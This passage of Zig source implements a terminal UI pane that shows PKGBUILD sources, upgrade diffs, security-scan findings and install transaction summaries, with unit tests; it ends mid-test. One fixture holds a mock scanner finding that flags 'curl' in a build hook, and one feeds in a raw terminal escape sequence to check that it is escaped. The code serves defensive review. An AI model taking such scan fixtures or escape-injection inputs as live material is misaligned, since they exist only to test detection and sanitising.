const styles = @import("styles.zig");
const std = @import("std");
const Allocator = std.mem.Allocator;
const Border = @import("border.zig");
const vaxis = @import("vaxis");
const vxfw = vaxis.vxfw;
const commands = @import("../commands.zig");
const operation = @import("../services/shelly_operation.zig");
const highlight = @import("source_highlight.zig");
const PkgBuild = @import("../models/pkgbuild.zig").PkgBuild;

// Only unwrap the CLI's known diff presentation tags; source files remain literal.
fn diffText(line: []const u8) []const u8 {
    for ([_][]const u8{ "[green]", "[red]", "[white]" }) |tag| {
        if (std.mem.startsWith(u8, line, tag) and std.mem.endsWith(u8, line, "[/]")) return line[tag.len .. line.len - 3];
    }
    return line;
}

test "CLI diff color wrappers become literal diff text" {
    try std.testing.expectEqualStrings("+ pkgver=2", diffText("[green]+ pkgver=2[/]"));
    try std.testing.expectEqualStrings("- pkgver=1", diffText("[red]- pkgver=1[/]"));
    try std.testing.expectEqualStrings("  unchanged", diffText("[white]  unchanged[/]"));
    try std.testing.expectEqualStrings("[unknown]literal[/]", diffText("[unknown]literal[/]"));
}

fn roleLabel(role: []const u8) []const u8 {
    const labels = .{
        .{ "requested", "Requested packages" },
        .{ "dependency", "Dependencies" },
        .{ "runtime_dependency", "Runtime dependencies" },
        .{ "build_dependency", "Build dependencies" },
        .{ "check_dependency", "Check dependencies" },
        .{ "optional_dependency", "Optional dependencies" },
    };
    inline for (labels) |pair| if (std.mem.eql(u8, role, pair[0])) return pair[1];
    return role;
}

pub const Document = struct {
    arena: std.heap.ArenaAllocator,
    lines: []const []const u8,
    rows: []const Row,

    const Builder = struct {
        lines: std.ArrayList([]const u8) = .empty,
        metadata: std.ArrayList(Metadata) = .empty,
    };
    const Metadata = struct { kind: highlight.Kind, prefix: usize = 0, reset: bool = false, style: ?vaxis.Style = null };
    fn append(alloc: std.mem.Allocator, builder: *Builder, text: []const u8, metadata: Metadata) !void {
        try builder.lines.append(alloc, text);
        try builder.metadata.append(alloc, metadata);
    }
    fn finish(arena: *std.heap.ArenaAllocator, builder: *Builder) !Document {
        const alloc = arena.allocator();
        const lines = try builder.lines.toOwnedSlice(alloc);
        const rows = try alloc.alloc(Row, lines.len);
        var state: highlight.State = .{};
        var budget: usize = 200_000;
        for (lines, builder.metadata.items, rows) |text, metadata, *item| {
            if (metadata.reset) state = .{};
            const spans = if (metadata.style) |style| blk: {
                const styled = try alloc.alloc(vxfw.RichText.TextSpan, 1);
                styled[0] = .{ .text = text, .style = style };
                break :blk styled;
            } else try highlight.highlight(alloc, text, metadata.prefix, metadata.kind, &state, &budget);
            item.* = .{ .prefix = metadata.prefix, .spans = spans };
        }
        return .{ .arena = arena.*, .lines = lines, .rows = rows };
    }

    pub fn init(allocator: std.mem.Allocator, builds: []const PkgBuild) !Document {
        if (builds.len == 0) return error.NoPkgbuildData;
        var arena = std.heap.ArenaAllocator.init(allocator);
        errdefer arena.deinit();
        const alloc = arena.allocator();
        var lines: Builder = .{};
        var remaining: usize = 2 * 1024 * 1024;
        for (builds) |build| {
            if (build.Scan) |scan| {
                const warnings = try alloc.alloc(operation.Warning, scan.findings.len);
                for (scan.findings, warnings) |finding, *warning| warning.* = .{
                    .Tool = finding.tool,
                    .Hook = finding.hook,
                    .Severity = finding.severity,
                    .Message = finding.message,
                    .MatchedLine = finding.matched_line,
                };
                try scanReview(alloc, &lines, warnings, true, &remaining);
            }
            try sourceStyled(alloc, &lines, build.PkgBuild, &remaining, .shell);
            if (build.Scan) |scan| {
                for (scan.related_files) |file| {
                    try section(alloc, &lines, file.name, &remaining);
                    try sourceStyled(alloc, &lines, file.content, &remaining, highlight.fileKind(file.name));
                }
            }
        }
        return finish(&arena, &lines);
    }

    pub fn fromQuestionForAction(allocator: std.mem.Allocator, question: operation.Question, action: operation.Action) !Document {
        var arena = std.heap.ArenaAllocator.init(allocator);
        errdefer arena.deinit();
        const alloc = arena.allocator();
        var lines: Builder = .{};
        var remaining: usize = 2 * 1024 * 1024;
        switch (question) {
            .pkgbuild => |review| {
                try scanReview(alloc, &lines, review.warnings, review.scan_reported, &remaining);
                // Install reviews show source; upgrades show CLI-computed changes.
                if (action == .upgrade and review.diff_lines.len > 0) {
                    var diff_size: usize = 0;
                    for (review.diff_lines) |line| {
                        if (line.len +| 1 > remaining -| diff_size) return error.PreviewTooLarge;
                        diff_size += line.len + 1;
                    }
                    const diff = try alloc.alloc([]const u8, review.diff_lines.len);
                    for (review.diff_lines, diff) |line, *plain| plain.* = diffText(line);
                    try sourceStyled(alloc, &lines, try std.mem.join(alloc, "\n", diff), &remaining, .diff);
                } else {
                    if (action == .upgrade and review.old_pkgbuild.len > 0)
                        try section(alloc, &lines, "No diff supplied; showing the proposed PKGBUILD.", &remaining);
                    try sourceStyled(alloc, &lines, review.new_pkgbuild, &remaining, .shell);
                }
                for (review.source_files) |file| {
                    try section(alloc, &lines, file.name, &remaining);
                    try sourceStyled(alloc, &lines, file.content, &remaining, highlight.fileKind(file.name));
                }
            },
            .yes_no => |request| {
                try source(alloc, &lines, request.question_text, &remaining);
                for (request.arguments) |argument| try source(alloc, &lines, argument, &remaining);
            },
            .transaction => |request| {
                try prose(alloc, &lines, request.question_text, &remaining);
                for (request.packages, 0..) |first, index| {
                    var seen = false;
                    for (request.packages[0..index]) |previous| {
                        if (std.mem.eql(u8, previous.role, first.role)) {
                            seen = true;
                            break;
                        }
                    }
                    if (seen) continue;
                    var count: usize = 0;
                    for (request.packages) |pkg| if (std.mem.eql(u8, pkg.role, first.role)) {
                        count += 1;
                    };
                    try append(alloc, &lines, "", .{ .kind = .plain });
                    const heading = try std.fmt.allocPrint(alloc, "{s} ({d})", .{ roleLabel(first.role), count });
                    try append(alloc, &lines, try displayText(alloc, heading, &remaining), .{ .kind = .heading });
                    for (request.packages) |pkg| {
                        if (!std.mem.eql(u8, pkg.role, first.role)) continue;
                        const origin = if (std.mem.eql(u8, pkg.source, "aur")) "AUR" else pkg.repository orelse pkg.source;
                        const text = try std.fmt.allocPrint(alloc, "• {s}{s}{s}  [{s}]", .{
                            pkg.name, if (pkg.version != null and pkg.version.?.len > 0) "  " else "", pkg.version orelse "", origin,
                        });
                        try prose(alloc, &lines, text, &remaining);
                    }
                }
                for (request.migrations) |migration| {
                    const text = try std.fmt.allocPrint(alloc, "Migration: {s} → {s} ({s})", .{ migration.path, migration.destination, migration.origin });
                    try prose(alloc, &lines, text, &remaining);
                }
                if (request.total_download_size) |size| {
                    try prose(alloc, &lines, try std.fmt.allocPrint(alloc, "Download: {d} bytes", .{size}), &remaining);
                }
                if (request.net_installed_size) |size| {
                    try prose(alloc, &lines, try std.fmt.allocPrint(alloc, "Installed size change: {d} bytes", .{size}), &remaining);
                }
            },
            inline .select_one, .select_many => |request| {
                try prose(alloc, &lines, request.prompt, &remaining);
                for (request.options) |option| {
                    try append(alloc, &lines, "", .{ .kind = .plain });
                    const text = try std.fmt.allocPrint(alloc, "{d}: {s}{s}{s}", .{
                        option.index,                                    option.name,
                        if (option.is_installed) " [installed]" else "", if (option.is_selected) " [selected]" else "",
                    });
                    try prose(alloc, &lines, text, &remaining);
                    if (option.description.len > 0)
                        try prose(alloc, &lines, try std.fmt.allocPrint(alloc, "  {s}", .{option.description}), &remaining);
                }
            },
        }
        return finish(&arena, &lines);
    }

    pub fn deinit(self: *Document) void {
        self.arena.deinit();
        self.* = undefined;
    }

    fn section(alloc: std.mem.Allocator, lines: *Builder, title: []const u8, remaining: *usize) !void {
        try append(alloc, lines, "", .{ .kind = .heading });
        const safe = try displayText(alloc, title, remaining);
        try append(alloc, lines, try std.fmt.allocPrint(alloc, "── {s} ──", .{safe}), .{ .kind = .heading });
    }

    fn findingStyle(severity: []const u8) vaxis.Style {
        return .{ .bold = true, .fg = .{ .index = if (std.ascii.eqlIgnoreCase(severity, "Critical")) @as(u8, 1) else if (std.ascii.eqlIgnoreCase(severity, "Info")) @as(u8, 6) else @as(u8, 3) } };
    }

    fn scanReview(alloc: Allocator, lines: *Builder, warnings: []const operation.Warning, reported: bool, remaining: *usize) !void {
        var critical: usize = 0;
        var has_warning = false;
        for (warnings) |finding| {
            if (std.ascii.eqlIgnoreCase(finding.Severity, "Critical")) critical += 1 else if (!std.ascii.eqlIgnoreCase(finding.Severity, "Info")) has_warning = true;
        }
        const summary = if (warnings.len > 0)
            if (critical > 0) try std.fmt.allocPrint(alloc, "Security scan: {d} finding{s}, {d} critical.", .{ warnings.len, if (warnings.len == 1) "" else "s", critical }) else try std.fmt.allocPrint(alloc, "Security scan: {d} finding{s}.", .{ warnings.len, if (warnings.len == 1) "" else "s" })
        else if (reported) "Security scan: no findings reported by the CLI." else "Security scan: results not supplied by the CLI.";
        const style: vaxis.Style = if (warnings.len > 0) findingStyle(if (critical > 0) "Critical" else if (has_warning) "Warning" else "Info") else if (reported) .{ .fg = .{ .index = 2 }, .bold = true } else styles.emphasis;
        try append(alloc, lines, try displayText(alloc, summary, remaining), .{ .kind = .plain, .style = style });
        for (warnings) |finding| {
            try append(alloc, lines, "", .{ .kind = .plain });
            const title = try std.fmt.allocPrint(alloc, "[{s}] {s} — {s}", .{
                if (finding.Severity.len > 0) finding.Severity else "Finding",
                if (finding.Tool.len > 0) finding.Tool else "Scanner",
                if (finding.Hook.len > 0) finding.Hook else "PKGBUILD",
            });
            try append(alloc, lines, try displayText(alloc, title, remaining), .{ .kind = .plain, .style = findingStyle(finding.Severity) });
            if (finding.Message.len > 0) try prose(alloc, lines, finding.Message, remaining);
            if (finding.MatchedLine.len > 0) try prose(alloc, lines, try std.fmt.allocPrint(alloc, "Matched: {s}", .{finding.MatchedLine}), remaining);
        }
        try append(alloc, lines, "", .{ .kind = .plain });
    }

    fn prose(alloc: std.mem.Allocator, lines: *Builder, text: []const u8, remaining: *usize) !void {
        var iterator = std.mem.splitScalar(u8, text, '\n');
        while (iterator.next()) |line| try append(alloc, lines, try displayText(alloc, line, remaining), .{ .kind = .plain });
    }

    fn source(alloc: std.mem.Allocator, lines: *Builder, text: []const u8, remaining: *usize) !void {
        return sourceStyled(alloc, lines, text, remaining, .plain);
    }

    fn sourceStyled(alloc: std.mem.Allocator, lines: *Builder, text: []const u8, remaining: *usize, kind: highlight.Kind) !void {
        if (text.len > remaining.*) return error.PreviewTooLarge;
        var iterator = std.mem.splitScalar(u8, text, '\n');
        var number: usize = 1;
        while (iterator.next()) |line| : (number += 1) {
            if (lines.lines.items.len >= 100_000) return error.PreviewTooLarge;
            const safe = try displayText(alloc, line, remaining);
            const prefix = try std.fmt.allocPrint(alloc, "{d: >5} │ ", .{number});
            try append(alloc, lines, try std.mem.concat(alloc, u8, &.{ prefix, safe }), .{ .kind = kind, .prefix = prefix.len, .reset = number == 1 });
        }
    }

    fn displayText(alloc: std.mem.Allocator, text: []const u8, remaining: *usize) ![]const u8 {
        if (text.len > remaining.*) return error.PreviewTooLarge;
        remaining.* -= text.len;
        if (!std.unicode.utf8ValidateSlice(text)) return error.InvalidSourceEncoding;
        var out: std.ArrayList(u8) = .empty;
        for (text) |byte| {
            if (byte == '\t') {
                try out.appendSlice(alloc, "    ");
            } else if (byte < 0x20 or byte == 0x7f) {
                const hex = "0123456789abcdef";
                try out.appendSlice(alloc, &.{ '\\', 'x', hex[byte >> 4], hex[byte & 15] });
            } else try out.append(alloc, byte);
            if (out.items.len > 8192) return error.SourceLineTooLong;
        }
        return out.toOwnedSlice(alloc);
    }
};

pub const Action = enum { close, retry, approve, decline, toggle_wrap };

pub const View = struct {
    name: []const u8,
    scroll: *vxfw.ScrollView,
    loading: bool,
    failure: ?anyerror,
    review: bool = false,
    pkgbuild_review: bool = false,
    transaction_review: bool = false,
    wrap: bool = true,
    choices: bool = false,
    choice_list: ?*vxfw.ListView = null,
    choice_prompt: []const u8 = "",
    optional_dependencies: bool = false,
    answer_input: []const u8 = "",
    answer_error: []const u8 = "",
    scan_status: []const u8 = "",

    pub fn handleKey(self: View, key: vaxis.Key) ?Action {
        if (!self.choices and commands.matches(key, .toggle_wrap)) return .toggle_wrap;
        if (self.review) {
            if (self.choices) {
                if (commands.matches(key, .confirm)) return .approve;
                return null;
            }
            return switch (commands.review(key) orelse return null) {
                .approve => .approve,
                .decline => .decline,
            };
        }
        if (commands.closesPreview(key)) return .close;
        if (commands.refreshes(key)) return .retry;
        return null;
    }

    pub fn draw(self: View, ctx: vxfw.DrawContext) std.mem.Allocator.Error!?vxfw.SubSurface {
        const max = ctx.max.size();
        const width = @min(max.width -| 2, @as(u16, 100));
        const height = @min(max.height -| 2, @as(u16, 36));
        if (width < 20 or height < 6) return null;
        return .{
            .origin = .{ .row = @intCast((max.height - height) / 2), .col = @intCast((max.width - width) / 2) },
            .surface = try self.drawInPane(ctx.withConstraints(.{}, .{ .width = width, .height = height })),
            .z_index = 3,
        };
    }

    /// Shared preview/review renderer; the caller owns placement and size.
    pub fn drawInPane(self: View, ctx: vxfw.DrawContext) std.mem.Allocator.Error!vxfw.Surface {
        const size = ctx.max.size();
        const width = size.width;
        const height = size.height;
        if (width < 12 or height < 5) {
            var small: vxfw.Text = .{ .text = "Enlarge the pane to view this content." };
            return small.draw(ctx);
        }
        const inner_width = width - 2;
        const inner_height = height - 2;
        const note_text = if (self.answer_error.len > 0) self.answer_error else self.scan_status;
        const note_height: u16 = if (note_text.len > 0) 1 else 0;
        const body_height = inner_height -| note_height;
        var children: std.ArrayList(vxfw.SubSurface) = .empty;
        if (self.loading or self.failure != null) {
            var text: vxfw.Text = .{ .text = if (self.failure) |err|
                try std.fmt.allocPrint(ctx.arena, "Could not load PKGBUILD preview ({s}).", .{@errorName(err)})
            else
                try std.fmt.allocPrint(ctx.arena, "Fetching PKGBUILD for {f}…", .{@import("diagnostics").safe(self.name)}) };
            try children.append(ctx.arena, .{
                .origin = .{ .row = 0, .col = 0 },
                .surface = try text.draw(ctx.withConstraints(.{}, .{ .width = inner_width, .height = body_height })),
            });
        } else if (self.choices and self.choice_list != null) {
            var prompt: vxfw.Text = .{ .text = try std.fmt.allocPrint(ctx.arena, "{f}", .{@import("diagnostics").safe(self.choice_prompt)}), .softwrap = true };
            const prompt_surface = try prompt.draw(ctx.withConstraints(.{}, .{ .width = inner_width, .height = body_height -| 1 }));
            try children.append(ctx.arena, .{ .origin = .{ .row = 0, .col = 0 }, .surface = prompt_surface });
            try children.append(ctx.arena, .{
                .origin = .{ .row = @intCast(prompt_surface.size.height), .col = 0 },
                .surface = try self.choice_list.?.draw(ctx.withConstraints(.{}, .{ .width = inner_width, .height = body_height -| prompt_surface.size.height })),
            });
        } else {
            try children.append(ctx.arena, .{
                .origin = .{ .row = 0, .col = 0 },
                .surface = try self.scroll.draw(ctx.withConstraints(.{}, .{ .width = inner_width, .height = body_height })),
            });
        }
        if (note_height > 0) {
            var note: vxfw.Text = .{ .text = note_text, .softwrap = false };
            try children.append(ctx.arena, .{
                .origin = .{ .row = @intCast(body_height), .col = 0 },
                .surface = try note.draw(ctx.withConstraints(.{}, .{ .width = inner_width, .height = note_height })),
            });
        }
        const content: vxfw.Surface = .{
            .widget = self.scroll.widget(),
            .size = .{ .width = inner_width, .height = inner_height },
            .buffer = &.{},
            .children = children.items,
        };
        const holder = try ctx.arena.create(FixedContent);
        holder.* = .{ .surface = content };
        const labels = [_]Border.BorderLabel{.{
            .text = if (self.review) (if (self.pkgbuild_review) "PKGBUILD review" else if (self.transaction_review) "Transaction review" else if (self.optional_dependencies) "Optional dependencies" else if (self.choices) "Dependency selection" else "Operation review") else try std.fmt.allocPrint(ctx.arena, "PKGBUILD — {f}", .{@import("diagnostics").safe(self.name)}),
            .alignment = .top_left,
        }};
        const border = try ctx.arena.create(Border);
        border.* = .{ .child = holder.widget(), .labels = &labels };
        const surface = try border.draw(ctx.withConstraints(
            .{ .width = width, .height = height },
            .{ .width = width, .height = height },
        ));
        return surface;
    }
};

const FixedContent = struct {
    surface: vxfw.Surface,
    fn widget(self: *FixedContent) vxfw.Widget {
        return .{ .userdata = self, .drawFn = draw };
    }
    fn draw(ptr: *anyopaque, _: vxfw.DrawContext) std.mem.Allocator.Error!vxfw.Surface {
        const self: *FixedContent = @ptrCast(@alignCast(ptr));
        return self.surface;
    }
};

pub const Row = struct { spans: []const vxfw.RichText.TextSpan, prefix: usize = 0 };

pub fn row(document: *const Document, index: usize) ?vxfw.Widget {
    if (index >= document.rows.len) return null;
    return rowWithWrap(document, index, true);
}

pub fn rowWithWrap(document: *const Document, index: usize, wrap: bool) ?vxfw.Widget {
    if (index >= document.rows.len) return null;
    return .{ .userdata = @ptrCast(@constCast(&document.rows[index])), .drawFn = if (wrap) drawWrappedLine else drawLine };
}

fn drawWrappedLine(ptr: *anyopaque, ctx: vxfw.DrawContext) Allocator.Error!vxfw.Surface {
    const item: *const Row = @ptrCast(@alignCast(ptr));
    const width = ctx.max.width orelse ctx.min.width;
    if (width == 0) return vxfw.Surface.init(ctx.arena, .{ .userdata = ptr, .drawFn = drawWrappedLine }, .{ .width = 0, .height = 0 });
    const prefix_width: usize = if (item.prefix > 0 and width >= 12) ctx.stringWidth(item.spans[0].text) else 0;
    var indent: usize = 0;
    for (item.spans[if (item.prefix > 0) @as(usize, 1) else 0..]) |span| {
        var done = false;
        for (span.text) |c| {
            if (c != ' ') {
                done = true;
                break;
            }
            indent += 1;
        }
        if (done) break;
    }
    indent = @min(indent, (width - prefix_width) / 3);
    var cells: std.ArrayList(vaxis.Cell) = .empty;
    try cells.appendNTimes(ctx.arena, .{}, width);
    var row_index: usize = 0;
    var col: usize = 0;
    if (prefix_width > 0) {
        var iterator = ctx.graphemeIterator(item.spans[0].text);
        while (iterator.next()) |g| {
            const text = g.bytes(item.spans[0].text);
            const size = ctx.stringWidth(text);
            cells.items[col] = .{ .char = .{ .grapheme = text, .width = @intCast(size) }, .style = item.spans[0].style };
            col += size;
        }
    }
    var word_start = true;
    for (item.spans[if (item.prefix > 0) @as(usize, 1) else 0..]) |span| {
        var iterator = ctx.graphemeIterator(span.text);
        while (iterator.next()) |g| {
            const text = g.bytes(span.text);
            const size = ctx.stringWidth(text);
            if (size == 0) continue;
            if (size > width - prefix_width) continue;
            const space = std.mem.eql(u8, text, " ");
            if (word_start and !space) {
                const start = @intFromPtr(text.ptr) - @intFromPtr(span.text.ptr);
                const rest = span.text[start..];
                const end = std.mem.indexOfScalar(u8, rest, ' ') orelse rest.len;
                const word_width = ctx.stringWidth(rest[0..end]);
                // Keep words intact when they fit a continuation row. Long
                // URLs and tokens still wrap by grapheme without losing text.
                if (word_width <= width - prefix_width - indent and col > prefix_width + indent and col + word_width > width) {
                    row_index += 1;
                    try cells.appendNTimes(ctx.arena, .{}, width);
                    col = prefix_width + indent;
                }
            }
            word_start = space;
            if (col + size > width) {
                row_index += 1;
                try cells.appendNTimes(ctx.arena, .{}, width);
                col = prefix_width + indent;
            }
            cells.items[row_index * width + col] = .{ .char = .{ .grapheme = text, .width = @intCast(size) }, .style = span.style };
            col += size;
        }
    }
    return .{ .widget = .{ .userdata = ptr, .drawFn = drawWrappedLine }, .size = .{ .width = width, .height = @intCast(row_index + 1) }, .buffer = try cells.toOwnedSlice(ctx.arena), .children = &.{} };
}

fn drawLine(ptr: *anyopaque, ctx: vxfw.DrawContext) std.mem.Allocator.Error!vxfw.Surface {
    const item: *const Row = @ptrCast(@alignCast(ptr));
    const rich = try ctx.arena.create(vxfw.RichText);
    rich.* = .{ .text = item.spans, .softwrap = false, .overflow = .clip };
    return rich.draw(ctx);
}

test "PKGBUILD document owns source and preserves URLs and related files" {
    const json = try std.testing.allocator.dupe(u8,
        \\[{"Name":"demo","PkgBuild":"source=(https://example.org/full/path?value=1)\n\techo hello","Scan":{"findings":[{"tool":"scanner","hook":"build","severity":"warning","message":"Inspect this","matched_line":"curl"}],"related_files":[{"name":"demo.install","content":"post_install() {}\n\u001b[31m"}]}}]
    );
    const parsed = try std.json.parseFromSlice([]PkgBuild, std.testing.allocator, json, .{ .allocate = .alloc_always });
    var document = try Document.init(std.testing.allocator, parsed.value);
    defer document.deinit();
    parsed.deinit();
    std.testing.allocator.free(json);
    const text = try std.mem.join(std.testing.allocator, "\n", document.lines);
    defer std.testing.allocator.free(text);
    try std.testing.expect(std.mem.indexOf(u8, text, "https://example.org/full/path?value=1") != null);
    try std.testing.expect(std.mem.indexOf(u8, text, "demo.install") != null);
    try std.testing.expect(std.mem.indexOf(u8, text, "[warning]") != null);
    const finding_offset = std.mem.indexOf(u8, text, "[warning]").?;
    const source_offset = std.mem.indexOf(u8, text, "source=(https://example.org").?;
    const attachment_offset = std.mem.indexOf(u8, text, "demo.install").?;
    try std.testing.expect(finding_offset < source_offset);
    try std.testing.expect(source_offset < attachment_offset);
    var matched_found = false;
    var source_found = false;
    for (document.lines, document.rows) |line, item| {
        if (std.mem.startsWith(u8, line, "Matched: curl")) {
            matched_found = true;
            try std.testing.expectEqual(@as(usize, 0), item.prefix);
        }
        if (std.mem.indexOf(u8, line, "source=(https://example.org") != null) {
            source_found = true;
            try std.testing.expect(item.prefix > 0);
            try std.testing.expect(std.mem.startsWith(u8, line, "    1 │ "));
        }
    }
    try std.testing.expect(matched_found and source_found);
    try std.testing.expect(std.mem.indexOf(u8, text, "\\x1b[31m") != null);
    try std.testing.expect(std.mem.indexOfScalar(u8, text, 0x1b) == null);
}

test "PKGBUILD document rejects empty invalid and oversized source" {
    try std.testing.expectError(error.NoPkgbuildData, Document.init(std.testing.allocator, &.{}));
    try std.testing.expectError(error.InvalidSourceEncoding, Document.init(std.testing.allocator, &.{
        .{ .Name = "test", .PkgBuild = "\xff" },
    }));
    const long = try std.testing.allocator.alloc(u8, 8193);
    defer std.testing.allocator.free(long);
    @memset(long, 'x');
    try std.testing.expectError(error.SourceLineTooLong, Document.init(std.testing.allocator, &.{
        .{ .Name = "test", .PkgBuild = long },
    }));
}

test "preview and operation review share highlighting without changing source or approval" {
    var preview = try Document.init(std.testing.allocator, &.{.{ .Name = "demo", .PkgBuild = "pkgname=demo\npkgdesc='quoted'\n# comment" }});
    defer preview.deinit();
    try std.testing.expectEqual(@as(usize, 3), preview.lines.len);
    try std.testing.expect(std.mem.endsWith(u8, preview.lines[0], "pkgname=demo"));
    var review = try Document.fromQuestionForAction(std.testing.allocator, .{ .pkgbuild = .{
        .question_id = "review-1",
        .package_name = "demo",
        .old_pkgbuild = "pkgver=1",
        .new_pkgbuild = "pkgver=2",
        .diff_lines = &.{ "--- old/PKGBUILD", "+++ new/PKGBUILD", "@@ -1 +1 @@", "-pkgver=1", "+pkgver=2" },
        .warnings = &.{},
        .source_files = &.{.{ .name = "demo.install", .content = "post_install() { echo ok; }" }},
    } }, .upgrade);
    defer review.deinit();
    var addition = false;
    var deletion = false;
    var function = false;
    for (review.rows) |item| for (item.spans) |span| {
        if (std.mem.eql(u8, span.text, "+pkgver=2")) addition = span.style.fg.index == 2;
        if (std.mem.eql(u8, span.text, "-pkgver=1")) deletion = span.style.fg.index == 1;
        if (std.mem.eql(u8, span.text, "post_install")) function = span.style.bold;
    };
    try std.testing.expect(addition and deletion and function);
    for (preview.lines, preview.rows) |text, item| {
        var joined: std.ArrayList(u8) = .empty;
        defer joined.deinit(std.testing.allocator);
        for (item.spans) |span| try joined.appendSlice(std.testing.allocator, span.text);
        try std.testing.expectEqualStrings(text, joined.items);
    }
    var scroll: vxfw.ScrollView = .{ .children = .{ .slice = &.{} } };
    const browsing: View = .{ .name = "demo", .scroll = &scroll, .loading = false, .failure = null };
    var reviewing = browsing;
    reviewing.review = true;
    try std.testing.expect(browsing.handleKey(.{ .codepoint = 'y' }) == null);
    try std.testing.expectEqual(Action.approve, reviewing.handleKey(.{ .codepoint = 'y' }).?);
}

test "source wraps with a single line number and retains colors and indentation" {
    vxfw.DrawContext.init(.unicode);
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var document = try Document.init(std.testing.allocator, &.{.{ .Name = "demo", .PkgBuild = "    pkgdesc='a long quoted description that wraps across several rows'" }});
    defer document.deinit();
    const ctx: vxfw.DrawContext = .{ .arena = arena.allocator(), .min = .{ .width = 28 }, .max = .{ .width = null, .height = null }, .cell_size = .{ .width = 10, .height = 20 } };
    const wrapped = try row(&document, 0).?.draw(ctx);
    try std.testing.expectEqual(@as(u16, 28), wrapped.size.width);
    try std.testing.expect(wrapped.size.height > 2);
    // The numbered gutter appears once; subsequent rows reserve the same gutter
    // and continuation indentation without repeating the line number.
    for (1..wrapped.size.height) |line| {
        for (0..12) |col| try std.testing.expectEqualStrings(" ", wrapped.buffer[line * 28 + col].char.grapheme);
    }
    var colored_rows: usize = 0;
    for (0..wrapped.size.height) |line| {
        for (wrapped.buffer[line * 28 .. (line + 1) * 28]) |cell| {
            if (cell.style.fg == .index and cell.style.fg.index == 2) {
                colored_rows += 1;
                break;
            }
        }
    }
    try std.testing.expect(colored_rows > 1);
    const unwrapped = try rowWithWrap(&document, 0, false).?.draw(ctx);
    try std.testing.expectEqual(@as(u16, 1), unwrapped.size.height);
    try std.testing.expect(unwrapped.size.width > 28);
    var scroll: vxfw.ScrollView = .{ .children = .{ .slice = &.{} } };
    const view: View = .{ .name = "demo", .scroll = &scroll, .loading = false, .failure = null };
    try std.testing.expect(view.wrap);
    try std.testing.expectEqual(Action.toggle_wrap, view.handleKey(commands.bindings.toggle_wrap).?);
}

test "wrapped diff continuations retain addition and removal colors" {
    vxfw.DrawContext.init(.unicode);
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var document = try Document.fromQuestionForAction(std.testing.allocator, .{ .pkgbuild = .{
        .question_id = "diff",
        .package_name = "demo",
        .old_pkgbuild = "pkgver=1",
        .new_pkgbuild = "pkgver=2",
        .diff_lines = &.{ "+a long addition that wraps across several rows", "-a long removal that wraps across several rows" },
        .warnings = &.{},
        .source_files = &.{},
    } }, .upgrade);
    defer document.deinit();
    var checked: usize = 0;
    for (document.rows, 0..) |item, index| {
        if (item.prefix == 0) continue;
        const source = item.spans[1].text;
        if (!std.mem.startsWith(u8, source, "+") and !std.mem.startsWith(u8, source, "-")) continue;
        const surface = try row(&document, index).?.draw(.{ .arena = arena.allocator(), .min = .{ .width = 24 }, .max = .{}, .cell_size = .{ .width = 10, .height = 20 } });
        try std.testing.expect(surface.size.height > 1);
        const color: u8 = if (source[0] == '+') 2 else 1;
        try std.testing.expectEqual(color, surface.buffer[24 + 8].style.fg.index);
        checked += 1;
    }
    try std.testing.expectEqual(@as(usize, 2), checked);
}

test "PKGBUILD review selects diff or full source without repeating revisions" {
    var review: operation.Question = .{ .pkgbuild = .{
        .question_id = "review",
        .package_name = "demo",
        .old_pkgbuild = "old_only=1",
        .new_pkgbuild = "new_only=2",
        .diff_lines = &.{ "[red]-changed=1[/]", "[green]+changed=2[/]" },
        .warnings = &.{},
        .source_files = &.{},
    } };
    var diff = try Document.fromQuestionForAction(std.testing.allocator, review, .upgrade);
    defer diff.deinit();
    const diff_text = try std.mem.join(std.testing.allocator, "\n", diff.lines);
    defer std.testing.allocator.free(diff_text);
    try std.testing.expect(std.mem.indexOf(u8, diff_text, "+changed=2") != null);
    try std.testing.expect(std.mem.indexOf(u8, diff_text, "old_only") == null);
    try std.testing.expect(std.mem.indexOf(u8, diff_text, "new_only") == null);
    var install = try Document.fromQuestionForAction(std.testing.allocator, review, .install);
    defer install.deinit();
    try std.testing.expectEqual(@as(usize, 3), install.lines.len);
    try std.testing.expect(std.mem.endsWith(u8, install.lines[2], "new_only=2"));
    review.pkgbuild.old_pkgbuild = "";
    var fresh = try Document.fromQuestionForAction(std.testing.allocator, review, .upgrade);
    defer fresh.deinit();
    const fresh_text = try std.mem.join(std.testing.allocator, "\n", fresh.lines);
    defer std.testing.allocator.free(fresh_text);
    try std.testing.expect(std.mem.indexOf(u8, fresh_text, "new_only=2") == null);
    try std.testing.expect(std.mem.indexOf(u8, fresh_text, "+changed=2") != null);
    var red = false;
    var green = false;
    for (fresh.rows) |item| for (item.spans) |span| {
        if (std.mem.eql(u8, span.text, "-changed=1")) red = span.style.fg.index == 1;
        if (std.mem.eql(u8, span.text, "+changed=2")) green = span.style.fg.index == 2;
    };
    try std.testing.expect(red and green);
    // Missing diff data must still allow inspection of the proposed source.
    review.pkgbuild.old_pkgbuild = "old_only=1";
    review.pkgbuild.diff_lines = &.{};
    var fallback = try Document.fromQuestionForAction(std.testing.allocator, review, .upgrade);
    defer fallback.deinit();
    const fallback_text = try std.mem.join(std.testing.allocator, "\n", fallback.lines);
    defer std.testing.allocator.free(fallback_text);
    try std.testing.expect(std.mem.indexOf(u8, fallback_text, "No diff supplied") != null);
    try std.testing.expect(std.mem.indexOf(u8, fallback_text, "new_only=2") != null);
}

test "transaction review groups dependencies without source code gutters or wire field labels" {
    var message = try operation.decodeJson(std.testing.allocator,
        \\{"$kind":"q.transaction","QuestionId":"1","QuestionText":"Proceed with AUR package installation?","Action":"install","Packages":[{"Name":"foot-git","Version":"1.2","Repository":"AUR","Source":"aur","Role":"requested"},{"Name":"scdoc","Repository":"extra","Source":"repository","Role":"build_dependency"},{"Name":"wayland-protocols","Repository":"extra","Source":"repository","Role":"build_dependency"},{"Name":"check","Source":"repository","Role":"check_dependency"},{"Name":"future","Source":"custom","Role":"future_role"}]}
    );
    defer message.deinit();
    var document = try Document.fromQuestionForAction(std.testing.allocator, message.value.question, .upgrade);
    defer document.deinit();
    const text = try std.mem.join(std.testing.allocator, "\n", document.lines);
    defer std.testing.allocator.free(text);
    for ([_][]const u8{ "Requested packages (1)", "Build dependencies (2)", "Check dependencies (1)", "foot-git  1.2  [AUR]", "scdoc  [extra]", "wayland-protocols", "future_role (1)", "future" }) |expected|
        try std.testing.expect(std.mem.indexOf(u8, text, expected) != null);
    try std.testing.expect(std.mem.indexOf(u8, text, "role=") == null);
